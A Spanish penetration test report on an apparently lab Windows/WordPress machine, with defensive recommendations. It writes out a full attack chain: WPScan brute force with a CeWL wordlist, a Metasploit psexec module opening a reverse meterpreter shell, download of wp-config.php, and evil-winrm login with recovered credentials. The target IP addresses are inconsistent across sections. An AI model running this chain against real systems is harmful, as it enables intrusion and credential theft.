
# Informe técnico: Máquina objetivo

Este informe técnico documenta de forma completa la prueba de penetración realizada sobre la máquina objetivo.

---

## Fase de escaneo y enumeración

El objetivo de esta fase fue identificar los servicios activos y posibles vectores de ataque. Para ello, se realizó un escaneo de puertos contra la máquina objetivo utilizando herramientas de reconocimiento.

<img width="1123" height="566" alt="image" src="https://github.com/user-attachments/assets/8595f388-17cf-48ad-bb95-6dca426ba915" />

Se detectaron los siguientes puertos abiertos:

| Puerto | Servicio | Descripción |
|---|---|---|
| 80 | HTTP | Servidor web (Apache/PHP) |
| 135 | RPC | Llamadas a procedimiento remoto |
| 139 | NetBIOS | Servicio de compartición de red Windows |
| 445 | SMB | Compartición de archivos Windows |
| 5985 | WinRM | Administración remota de Windows |

### Análisis de los servicios detectados

### Puerto 80 (HTTP)
El puerto 80 está abierto y accesible, alojando un servidor web basado en Apache con soporte PHP. Durante la enumeración se identificó un sitio web basado en WordPress.

Posibles vectores de ataque:

- Enumeración de usuarios.
- Ataques de fuerza bruta contra el panel de acceso.
- Explotación de plugins o servicios vulnerables.

### Puertos 135, 139, 445 (RPC/NetBIOS/SMB)
Estos puertos corresponden a servicios internos de Windows usados para compartición de archivos y administración remota.

Posibles vectores de ataque:

- Enumeración de recursos compartidos.
- Acceso a archivos internos.
- Autenticación con credenciales válidas.
- Ejecución remota de comandos si se obtienen privilegios suficientes.

### Puerto 5985 (WinRM)
El servicio WinRM permite administración remota del sistema a través de HTTP.

Posibles vectores de ataque:

- Acceso remoto mediante credenciales válidas.
- Ejecución remota de comandos.
- Control total del sistema sin necesidad de explotación adicional.

### Conclusión de la fase de escaneo
El sistema expone múltiples servicios que incrementan notablemente la superficie de ataque.

En particular:

- El servicio web en el puerto 80 podía revelar información útil y posibles credenciales.
- SMB (445) y WinRM (5985) podían ser utilizados para acceso remoto si se comprometían credenciales.

### Recomendaciones generales para entornos Windows

- Restringir el acceso al puerto 80 únicamente a redes internas o a una zona bastionada; bloquear el acceso externo al servidor web.
- Limitar el acceso a los puertos 135, 139 y 445 solo a equipos internos de confianza y deshabilitar SMBv1 si estuviera habilitado.
- Revisar y endurecer la gestión de credenciales web y, si se utiliza WinRM, configurarlo sobre HTTPS (puerto 5986) en lugar de exponerlo a redes abiertas.

---

## 1. Servidor web accesible en el puerto 80

<img width="527" height="279" alt="image" src="https://github.com/user-attachments/assets/e548de12-8bac-4a75-9b6d-443b7d55c623" />

### Enumeración del servicio web (Puerto 80)
La máquina objetivo expone un servicio web activo en el puerto 80 que es accesible desde la red.

Al acceder mediante navegador, se observó un sitio funcional sin una protección visible frente a enumeración o ataques automatizados.

### Análisis web con WhatWeb
Se utilizó WhatWeb para identificar las tecnologías empleadas por el servidor.

Tecnologías detectadas:

- Servidor web: Apache 2.4.41
- Sistema operativo: Windows (64 bits)
- Lenguaje: PHP 7.3.12

<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/974e137b-72fa-4659-a889-08a1d1edacbd" />

### Análisis de seguridad
La exposición de versiones concretas del servidor web y del lenguaje de programación permite a un atacante:

- Identificar vulnerabilidades conocidas.
- Buscar exploits públicos asociados a esas versiones.

La divulgación de versiones facilita la localización de exploits específicos para Apache y PHP.

### Recomendaciones

- Ocultar o limitar la exposición de versiones en las cabeceras HTTP (por ejemplo, ocultar Apache/X.X y PHP/XX).
- Actualizar Apache y PHP a versiones recientes parcheadas, especialmente si el servidor está expuesto externamente.
- Auditar el servidor con escáneres de vulnerabilidades como Nuclei y WPScan para detectar fallos compatibles con las versiones actuales.

---

## Fuzzing de directorios

### Enumeración de rutas y descubrimiento de directorios
Se realizó un proceso de fuzzing sobre el servidor web utilizando FFUF para identificar rutas ocultas y servicios accesibles.

### Resultados obtenidos
Se identificaron varias rutas asociadas a una instalación de WordPress:

- `/wp-admin` → Panel de administración.
- `/wp-login.php` → Página de autenticación.
- `/wp-config.php` → Archivo de configuración.
- `/xmlrpc.php` → Interfaz de comunicación remota.
- `/license.txt` y `/readme.html` → Archivos de documentación.

<img width="1031" height="909" alt="image" src="https://github.com/user-attachments/assets/0ecbf1b7-1ec9-4f8d-aa62-6a768c43e5a5" />

### Vulnerabilidades identificadas

#### Exposición de la estructura de WordPress — Severidad: Media
La accesibilidad a rutas como `/wp-admin` y `/wp-login.php` permite identificar el sistema y facilita ataques dirigidos.

#### Exposición de archivos de documentación — Severidad: Media
Archivos como `readme.html` o `license.txt` pueden revelar:

- La versión de WordPress.
- Información del sistema.

Esto ayuda a los atacantes a buscar vulnerabilidades conocidas.

#### Posible exposición del archivo de configuración (`wp-config.php`) — Severidad: Crítica
El archivo `wp-config.php` contiene información sensible como:

- Credenciales de base de datos.
- Configuración interna.

Si este archivo es accesible desde el navegador, puede derivar en un compromiso total del sistema.

#### XML-RPC habilitado — Severidad: Alta
El archivo `/xmlrpc.php` permite:

- Ataques automatizados de fuerza bruta.
- Enumeración de usuarios.
- Posibles ataques de denegación de servicio.

### Conclusión
El fuzzing permitió identificar la estructura interna del sitio, confirmar el uso de WordPress y localizar varios puntos de ataque que podrían utilizarse en fases posteriores de explotación.

---

## Análisis de WordPress y comportamiento de redirección

### Análisis del sitio WordPress
Al acceder al sitio WordPress en `http://192.168.0.27/wordpress/`, se observó un comportamiento anómalo durante la navegación.

### Comportamiento detectado

- Algunas rutas redirigían o devolvían errores que indicaban que el servidor estaba configurado como si funcionara en localhost o en un entorno de pruebas.
- El panel de login de WordPress (`wp-login.php`) no permitía el acceso correcto incluso disponiendo de credenciales válidas.

<img width="468" height="282" alt="image" src="https://github.com/user-attachments/assets/31abc063-7028-4fb0-a0f4-0bf601c8342b" />

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/92637635-654f-4b61-849b-fae7569925b4" />

### Análisis automatizado del servicio web
Dado el comportamiento detectado, el análisis se centró en la única página que respondía de forma consistente y mostraba cabeceras HTTP claras. Se realizó un análisis automatizado de este recurso, revelando varias debilidades de seguridad relevantes.

### Vulnerabilidad: Exposición del panel de login de WordPress
Se identificó una página de autenticación de WordPress que permanecía accesible directamente a pesar de posibles intentos de ocultación o restricción.

Ruta accesible: `/wp-login.php`

Esto facilita la enumeración y los ataques de fuerza bruta contra el sistema de autenticación.

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/9a109ead-e28f-4cc4-afb1-22ada8c41500" />

Referencia asociada:
- CVE-2024-2473 (referencia relacionada con la exposición del endpoint de login en configuraciones inseguras o mal protegidas).

---

## Enumeración y análisis de WordPress

Durante la fase de análisis del servicio web se identificó que WordPress permitía la enumeración de usuarios a través de la API REST.

### Enumeración de usuarios
Utilizando el endpoint:

`/wp-json/wp/v2/users`

Se identificaron los siguientes usuarios válidos del sistema:

- Administrator
- Roldan

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/0cbafa23-5dbe-4523-96a1-c7a487477db5" />

### Análisis automatizado con Nuclei
Posteriormente se ejecutó Nuclei contra la URL del sitio: `http://192.168.0.27/wordpress/`

El análisis detectó varios indicadores de seguridad relevantes:

Vulnerabilidades detectadas:

- Panel de login de WordPress expuesto — Media.
- Enumeración de usuarios habilitada — Media/Alta.
- Formulario de acceso disponible (posible fuerza bruta) — Alta.
- WordPress versión 5.4.19 desactualizado — Media.
- PHP 7.3.x desactualizado — Media.
- Archivos informativos expuestos (`readme` / directory listing) — Baja/Informativa.

<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/8229344d-5a53-4067-ae37-3d158d9c32ab" />
<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/451e7112-bbdd-4440-9b3a-b5c5cb786107" />

### Impacto de las vulnerabilidades

Estas debilidades permiten a un atacante:

- Identificar usuarios válidos del sistema.
- Realizar ataques de fuerza bruta contra el panel de acceso.
- Explotar versiones desactualizadas con vulnerabilidades conocidas.
- Incrementar la superficie de ataque del servicio web.

### Recomendaciones generales

- Actualizar WordPress y PHP a versiones actuales y parcheadas.
- Deshabilitar o restringir la API REST de WordPress y `wp-json`.
- Ocultar `readme.html`, `license.txt` y limitar el listado de directorios.
- Controlar y validar las redirecciones para evitar usos maliciosos.
- Reforzar la seguridad del acceso con bloqueo de intentos, captchas y autenticación en dos factores.

---

## Creación de diccionario con CeWL

CeWL se utilizó para generar un diccionario personalizado a partir del contenido del sitio WordPress, con el objetivo de emplearlo posteriormente en ataques de fuerza bruta contra el panel de autenticación.

### Comando ejecutado
```bash
cewl -e http://192.168.0.27/wordpress/ -m 4 -w prototipo_xd
```

### Resultado
Se generó un diccionario denominado `prototipo_xd` a partir de palabras extraídas del contenido de la página. Entre los términos más relevantes se encontraron:

- Roldan
- Quesos
- Manchego
- Quesosroldan

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/4f616aef-bd23-44fe-9117-bcee5134b763" />

### Análisis
El diccionario generado contenía términos contextuales del propio objetivo, aumentando la eficacia frente a diccionarios genéricos. Este enfoque adapta el ataque al entorno real del sistema objetivo.

### Clasificación de la vulnerabilidad

- Tipo: Exposición de información útil para ataques de diccionario.
- Severidad: Media.
- Impacto: Facilita ataques de fuerza bruta dirigidos al panel de autenticación.

### Recomendaciones

- Restringir el acceso al panel de administración de WordPress por IP o red interna.
- Ocultar o modificar la URL `wp-login.php` para dificultar ataques automatizados.
- Reforzar la seguridad del inicio de sesión con bloqueo por intentos fallidos y autenticación en dos factores.

---

## Explotación de WordPress

### Ataque de fuerza bruta contra WordPress
Se utilizó WPScan para realizar un ataque de fuerza bruta contra el panel de autenticación de WordPress empleando el diccionario personalizado generado anteriormente.

### Comando ejecutado
```bash
wpscan --url http://192.168.0.27/wordpress/ --usernames administrador,roldan --passwords prototipo_xd
```

### Objetivo
Obtener credenciales válidas para acceder al panel de administración mediante ataque de diccionario.

### Resultado
El ataque fue exitoso, obteniendo las siguientes credenciales:

- Usuario: `roldan`
- Contraseña: `QuesoManchego`

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/0274338c-177b-43fe-843a-2734eecce46d" />

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/bb74396c-d59c-42f2-9c0e-48f068d2aa2f" />

- Al intentar iniciar sesión, el sitio redirigía a localhost, por lo que no se pudo acceder al panel administrativo desde la máquina atacante.
- Tipo de vulnerabilidad: acceso administrativo válido bloqueado por una configuración incorrecta de URL.
- Severidad: Alta.

### Recomendaciones

- Revisar los valores WordPress Address y Site URL para que no apunten a localhost.
- Eliminar o corregir el sitio de pruebas en localhost si no está en producción.
- Restringir el acceso al panel de administración a IPs internas en entornos de producción.

---

## Pivot hacia SMB

### Acceso al servicio SMB
Usando las credenciales obtenidas previamente del ataque de fuerza bruta a WordPress, se probó el acceso al servicio SMB expuesto en la máquina Windows.

### Validación y acceso
Se utilizó NetExec para verificar la validez de las credenciales contra SMB:

```bash
netexec smb 192.168.5.140 -u roldan -p "QuesoManchego"
```

<img width="1062" height="562" alt="image" src="https://github.com/user-attachments/assets/f665994c-7593-4883-8525-980d967114b1" />

### Enumeración de usuarios y recursos
Tras la validación, se realizaron tareas de enumeración:

**Usuarios del sistema:**

- Administrador
- Guest
- Roldan

**Recursos compartidos detectados:**

- ADMIN$
- C$
- IPC$

### Clasificación de la vulnerabilidad

- Tipo: Acceso no autorizado mediante credenciales válidas.
- Severidad: Alta.
- Impacto: Acceso a recursos internos del sistema Windows y enumeración de información sensible.

### Recomendaciones

- Restringir el acceso SMB únicamente a redes internas, con control de credenciales.
- Evitar cuentas locales débiles (`roldan`, `administrator`) con contraseñas relacionadas con el contenido web.
- Separar claramente el entorno web de pruebas de la red de producción para evitar que credenciales de laboratorio puedan reutilizarse en el sistema real.

---

## Ejecución remota vía SMB (Metasploit)

Tras obtener credenciales válidas en el sistema, se identificó la posibilidad de acceder al servicio SMB de Windows. A partir de la enumeración previa, se observó que el usuario tenía permisos suficientes para interactuar con recursos administrativos, lo que motivó el uso de un módulo de ejecución remota.

### Módulo utilizado
`exploit/windows/smb/ms17_010_psexec`

Este módulo permite ejecutar comandos remotos a través de SMB usando credenciales válidas.

### Configuración del exploit

- Usuario: `roldan`
- Contraseña: `QuesoManchego`
- Host objetivo: `192.168.0.26`
- Puerto: `445`
- Payload: `meterpreter/reverse_tcp`
- LHOST: `192.168.0.19`
- LPORT: `4444`

<img width="1183" height="549" alt="image" src="https://github.com/user-attachments/assets/0dca61f4-a636-4203-9a4a-8d9846ed13d3" />

### Justificación de la explotación
Después de validar el acceso SMB con credenciales válidas y observar la existencia de recursos administrativos, se concluyó que el usuario tenía privilegios suficientes para ejecutar código remotamente.

Por este motivo se utilizó el módulo PsExec, que crea un servicio en el sistema objetivo y ejecuta una carga maliciosa.

El exploit estableció una conexión remota con el sistema víctima mediante una sesión Meterpreter, confirmando la ejecución remota de código en el host Windows.

### Clasificación de la vulnerabilidad

- Tipo: Ejecución remota de código vía SMB.
- Severidad: Crítica.
- Impacto: Compromiso total del sistema (acceso remoto a la máquina Windows).

---

## Acceso a archivos internos y extracción de credenciales

Una vez obtenido acceso remoto mediante la sesión Meterpreter, se buscaron archivos sensibles dentro del sistema. Dado que ya se había identificado WordPress, se apuntó al archivo de configuración (`wp-config.php`), ya que normalmente contiene credenciales de base de datos.

### Búsqueda del archivo de configuración
Se utilizó el siguiente comando:

```bash
dir /s /b C:\wp-config.php
```

Se identificó la siguiente ruta:

`C:\wamp64\www\wordpress\wp-config.php`

### Descarga del archivo
Después de localizarlo, el archivo se descargó a la máquina atacante a través de Meterpreter:

```bash
download C:\\wamp64\\www\\wordpress\\wp-config.php
```

El archivo fue transferido correctamente al sistema del auditor.

<img width="999" height="602" alt="image" src="https://github.com/user-attachments/assets/8cfadd39-cb5f-44dc-bea1-216429307294" />

<img width="1185" height="590" alt="image" src="https://github.com/user-attachments/assets/ca8af1e5-953d-48b9-b22e-edc0f687b295" />

El acceso web previo no permitía visualizar este archivo debido a restricciones del servidor y a la configuración orientada a localhost. Sin embargo, una vez obtenido acceso directo al sistema, fue posible acceder al archivo de configuración que contenía información sensible como:

- Credenciales de base de datos.
- Configuración interna de WordPress.

El archivo de configuración de WordPress contiene credenciales en texto claro para la conexión a la base de datos.

La obtención de estas credenciales implica:

- Acceso directo a la base de datos del sistema.
- Posibilidad de leer, modificar o eliminar información.
- Acceso a datos sensibles como usuarios, contraseñas y contenido del sitio.

Esta cadena de ataque demuestra cómo una vulnerabilidad inicial en el servicio web puede derivar en el compromiso total del sistema y en la exposición de credenciales críticas.

---

## Acceso remoto mediante WinRM

Tras obtener credenciales desde `wp-config.php`, estas se reutilizaron contra otros servicios del sistema. Dado que WinRM (puerto 5985) estaba activo, se intentó el acceso remoto con dichas credenciales.

```bash
evil-winrm -i 192.168.0.26 -u Administrator -p T00MuchW0rk70D0
```

<img width="1208" height="571" alt="image" src="https://github.com/user-attachments/assets/4f10fe47-3bba-47ae-89d5-f75e7f964bf5" />

### Clasificación de la vulnerabilidad

- Tipo: Reutilización de credenciales / acceso remoto no autorizado.
- Severidad: Crítica.
- Impacto: Control total del sistema (acceso de administrador).

La reutilización de credenciales permitió el acceso directo al sistema mediante WinRM con privilegios administrativos, confirmando el compromiso total de la máquina.

---

## Conclusión

Esta auditoría demostró que, partiendo del acceso inicial al servicio web, es posible comprometer por completo la infraestructura.

La combinación de credenciales débiles, reutilización de contraseñas y exposición de servicios internos permitió escalar el ataque hasta obtener máximos privilegios en ambos sistemas.

Esto representa un riesgo crítico para la organización, ya que un atacante podría tomar control total de los sistemas, acceder a información sensible y comprometer la integridad del entorno.
